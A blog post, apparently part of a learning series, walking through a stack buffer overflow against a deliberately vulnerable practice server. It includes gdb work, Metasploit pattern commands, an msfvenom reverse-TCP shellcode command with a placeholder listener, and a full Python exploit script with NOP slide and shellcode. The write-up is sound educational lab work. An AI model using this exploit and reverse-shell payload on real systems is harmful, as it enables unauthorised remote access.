---
layout: default
title: Learning binary exploitation — 3
---

Learning binary exploitation — 3
================================

The vulnerable code I used in this blog:

[Vulnerable-Server/exploit\_smart\_server.py at master · dennis95stumm/Vulnerable-Server](https://github.com/dennis95stumm/Vulnerable-Server/blob/master/exploit_smart_server.py)

Overflowing the buffer
======================

First, I used gdb to figure out which function was responsible for checking the input we provide. Looks like checkAuth is the function I was looking for.

![](/assets/images/learning-binary-exploitation-3/bin-exp-3-1.png)

To observe the state of the registers and the stack, I created a breakpoint right after strcmp instruction in checkAuth function. Then I created a buffer of length 5000 hoping that it would be sufficient to overflow the buffer.

```
msf-pattern\_create -l 5000
```
![](/assets/images/learning-binary-exploitation-3/bin-exp-3-2.png)
It was sufficient!

Notice the address at the bottom, that’s the EIP. After obtaining the EIP, I tried to find the exact offset required to overflow the buffer.

```
msf-pattern\_offset -l 5000 -q 0x63413962
```

*   _The offset was 58_

At this point I realized two things:

1.  Even if I send a normal input after setting a breakpoint, the contents of `secret_buffer`, which holds the key to validating our input, is revealed.
2.  If I had looked at the code of `checkAuth` function first, instead of being a skid and going straight into exploitation, I would’ve instantly found the key (secret\_buffer) and noticed another variable `auth_flag` which determines if the program should move forward or not.

![](/assets/images/learning-binary-exploitation-3/bin-exp-3-3.png)
LESSON LEARNED

Anyway, what’s happening here is, when we overflow the buffer it actually overwrites the auth\_flag too which is then returned by `checkAuth`function and is eventually checked if it’s true or not, so any value other than 0 will get us through.

Shellcode Injection
===================

Now I could perfectly overwrite EIP with `python -c 'print "A"*58+"BBBB"'`

![](/assets/images/learning-binary-exploitation-3/bin-exp-3-left.png)
EIP Overwritten

Now, I just had to find a unique address to inject the shellcode.

**_Note: Do_** `**unset env**` **_in gdb to remove any environment variables during the program run which may alter the memory addresses_**

Before finding a location for my shellcode, I had to generate one.

```
msfvenom -p linux/x86/shell\_reverse\_tcp -b "\\x00" LHOST=<listening-ip> LPORT=<listening-port> -f python -o reverse
```

Also, to make sure memory address don’t get messed up I used NOPs too. I struggled quite a bit to find a suitable memory address. Here’s how I did it:

1.  I just used `print pad+nopslide+test_payload`to find the address where “\\x43” starts
2.  Then used that address in place of $eip, hoping that eip will point to the location of my shellcode (test\_payload, in the previous step)
3.  Now, I tested `print pad+eip+nopslide+test_payload` and this time I noticed “\\x43” started from a different address, maybe the additional 4 bytes of $eip that I provided had somehow shifted the memory locations.
4.  So, I used the address I found in (3) in eip and redirected the output of exploit.py into the program and got a shell

P.S. I’m not sure if this is the right way to do this.

Here’s the exploit script that I used:

```
import structpad = "A"\*58  
eip = struct.pack("<I", 0xffffd1b2)   
buf =  b""  
buf += b"\\xd9\\xee\\xba\\x44\\x2f\\xab\\x19\\xd9\\x74\\x24\\xf4\\x5f\\x31"  
buf += b"\\xc9\\xb1\\x12\\x31\\x57\\x17\\x83\\xef\\xfc\\x03\\x13\\x3c\\x49"  
buf += b"\\xec\\xaa\\x99\\x7a\\xec\\x9f\\x5e\\xd6\\x99\\x1d\\xe8\\x39\\xed"  
buf += b"\\x47\\x27\\x39\\x9d\\xde\\x07\\x05\\x6f\\x60\\x2e\\x03\\x96\\x08"  
buf += b"\\x71\\x5b\\x50\\xcd\\x19\\x9e\\xa1\\xee\\xf0\\x17\\x40\\x40\\x64"  
buf += b"\\x78\\xd2\\xf3\\xda\\x7b\\x5d\\x12\\xd1\\xfc\\x0f\\xbc\\x84\\xd3"  
buf += b"\\xdc\\x54\\x31\\x03\\x0c\\xc6\\xa8\\xd2\\xb1\\x54\\x78\\x6c\\xd4"  
buf += b"\\xe8\\x75\\xa3\\x97"test\_payload = "C"\*95  
nopslide = "\\x90"\*100print pad+eip+nopslide+buf
```

Of course, I could’ve just used sockets to make things easier, but I was feeling a bit adventurous ¯\\\_(ツ)\_/¯

So I sent this payload…

![](/assets/images/learning-binary-exploitation-3/bin-exp-3-4.png)

...and I got the shell!

Thank you for reading.
